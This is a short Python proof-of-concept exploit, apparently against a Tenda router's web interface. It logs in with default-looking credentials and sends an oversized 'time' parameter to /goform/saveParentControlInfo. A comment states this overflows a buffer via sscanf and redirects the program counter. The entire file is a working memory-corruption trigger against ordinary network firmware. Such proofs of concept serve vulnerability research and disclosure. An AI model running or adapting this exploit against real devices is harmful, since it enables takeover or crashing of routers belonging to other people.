#!/usr/bin/env python3

# series of bof in saveParentControlInfo - 0x4a15bc, using sscanf to trigger and get $pc to point to 0x626262

import common

t = common.Tendown('192.168.0.1', '80', 'user', 'user')
t.login()
p = {'time':'c-'+'a'*0x28 + 'bbb'}
t.post_request('/goform/saveParentControlInfo', p)
